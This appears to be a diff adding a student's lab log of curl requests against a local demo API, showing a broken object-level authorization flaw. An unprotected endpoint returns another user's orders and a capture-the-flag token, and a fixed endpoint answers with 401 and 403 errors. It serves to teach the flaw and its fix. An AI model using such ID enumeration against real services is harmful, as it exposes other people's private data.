@@ -1,0 +1,56 @@
+danaiphong | 6631503106 | 2026-10-23 21:54:03 +07
+
+$ curl -sS -i http://localhost:8080/api/users/3/orders 
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 112
+Connection: close
+
+[{"item":"Server rack","order_id":"C-1","total":5000},{"item":"FLAG{bola_demo}","order_id":"C-FLAG","total":0}]
+
+
+$ curl -sS -i http://localhost:8080/api/users/2/orders 
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 47
+Connection: close
+
+[{"item":"Mouse","order_id":"B-1","total":15}]
+
+
+$ curl -sS -i http://localhost:8081/api/users/3/orders 
+HTTP/1.1 401 UNAUTHORIZED
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: close
+
+{"error":"authentication required"}
+
+
+$ curl -sS -i -H X-User-Id:\ 1 http://localhost:8081/api/users/3/orders 
+HTTP/1.1 403 FORBIDDEN
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 22
+Connection: close
+
+{"error":"forbidden"}
+
+
+$ curl -sS -i -H X-User-Id:\ 1 http://localhost:8081/api/users/1/orders 
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 50
+Connection: close
+
+[{"item":"Keyboard","order_id":"A-1","total":30}]
+
